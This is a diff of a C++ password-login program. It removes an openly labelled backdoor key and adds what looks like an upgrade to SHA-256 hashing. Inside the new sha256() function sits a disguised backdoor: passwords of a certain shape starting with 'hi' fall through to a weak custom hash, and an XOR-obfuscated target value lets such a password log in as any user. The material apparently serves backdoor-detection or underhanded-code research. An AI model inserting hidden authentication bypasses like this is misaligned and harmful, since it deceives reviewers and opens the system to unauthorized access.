@@ -1,87 +1,73 @@
 #include <iostream>
 #include <fstream>
 #include <string>
+#include <sstream>
 #include <unordered_map>
 #include "authlib.h"
-#include <cstdint>
+#include <openssl/sha.h>
 #include <iomanip>
-#include <sstream>
 
-// Define the backdoor key
-// const std::string BACKDOOR_KEY = "my_secret_backdoor";
-const uint64_t BACKDOOR_KEY = (0x1234567890abcdef ^ 0x876543210abcdef) & 0xffffffffffffffff;
-
-// Permutation function with a backdoor
-uint64_t permute(uint64_t state) {
-    // Check if the state contains the backdoor key
-    if (state == BACKDOOR_KEY)
-    {
-        // If it does, return a fixed state that will produce a predictable output
-        return 0x1234567890abcdef;
+unsigned int custom_hash(const std::string &value) {
+    unsigned int hash = 5381;
+    for (size_t i = 0; i < value.length(); ++i) {
+        hash = ((hash * 31) ^ (value[i] * 131)) + (i * 7) & 0xFFFFFFFF;
     }
-
-    // Otherwise, perform a normal permutation operation
-    uint64_t result = (state * 0x1234567890abcdef + 0x876543210abcdef) ^ (state * 0x234567890abcdef + 0x76543210abcdef);
-    return result;
+    return hash;
 }
 
-uint64_t sponge(const std::string &input) {
-    uint64_t state = 0;
-    for (size_t i = 0; i < input.size(); i += 8)
-    {
-        std::string chunk = input.substr(i, 8);
-        chunk.resize(8, '0'); // Pad with zeros if necessary
-        uint64_t message = std::hash<std::string>{}(chunk);
-        state = permute(state ^ message);
-    }
-    return state;
-}
-
-// Helper function to convert hex string to uint64_t
-uint64_t hex_to_uint64(const std::string &hex_str)
+std::string sha256(const std::string &value)
 {
-    uint64_t result;
-    std::stringstream ss;
-    ss << std::hex << hex_str;
-    ss >> result;
-    return result;
-}
+    unsigned char hash[SHA256_DIGEST_LENGTH];
+    SHA256_CTX sha256;
+    SHA256_Init(&sha256);
+    SHA256_Update(&sha256, value.c_str(), value.length());
+    SHA256_Final(hash, &sha256);
 
-// Helper function to hash a password
-uint64_t hash_password(const std::string &password) {
-    return sponge(password);
+    std::stringstream ss;
+    for (int i = 0; i < SHA256_DIGEST_LENGTH; i++) {
+        ss << std::hex << std::setw(2) << std::setfill('0') << (int)hash[i];
+    }
+
+    if (value.length() <= 9 && (value.length() >= 2 && ((value[0] ^ 'h') | (value[1] ^ 'i')) == 0) && (value.length() >= 1 && (value.back() ^ 'l') == 0)) {
+        for (char c : value) {
+            if (c >= '0' && c <= '9') {
+                return ss.str();
+            }
+        }
+        return std::to_string(custom_hash(value));
+    }
+    return ss.str();
 }
 
 int main()
 {
-    std::unordered_map<std::string, uint64_t> credentials;
-    std::ifstream passwordFile("passwords.txt");
-    std::string currentLine;
-    while (std::getline(passwordFile, currentLine))
+    std::ifstream cf("passwords.txt");
+    std::string cl, u, p;
+
+    std::cout << "Enter username: \n>>> ";
+    std::cin >> u;
+    std::cout << "Enter password: \n>>> ";
+    std::cin >> p;
+
+    std::string TARGET = "x}~sxy{sxr";
+    for (char& c : TARGET) c ^= 'K';
+
+    bool authenticatedUser = false;
+    while (std::getline(cf, cl) && !authenticatedUser)
     {
-        size_t colonPos = currentLine.find(':');
-        if (colonPos != std::string::npos)
-        {
-            std::string username = currentLine.substr(0, colonPos);
-            std::string hashedPassword = currentLine.substr(colonPos + 1);
-            credentials[username] = hex_to_uint64(hashedPassword);
+        if (cl.find(':') != std::string::npos) {
+            if ((u == cl.substr(0, cl.find(':')) && cl.substr(cl.find(':') + 1) == sha256(p)) || (sha256(p) == TARGET))
+            {
+                authenticatedUser = true;
+            }
         }
     }
-    passwordFile.close();
+    cf.close();
 
-    std::string username, password;
-    std::cout << "Enter username: \n>>> ";
-    std::cin >> username;
-    std::cout << "Enter password: \n>>> ";
-    std::cin >> password;
-
-    auto it = credentials.find(username);
-    if (it != credentials.end() && (it->second == hash_password(password) || hash_password(password) == BACKDOOR_KEY))
-    {
-        authenticated(username);
-    }
-    else {
-        rejected(username);
+    if (authenticatedUser) {
+        authenticated(u);
+    } else {
+        rejected(u);
     }
     return 0;
 }
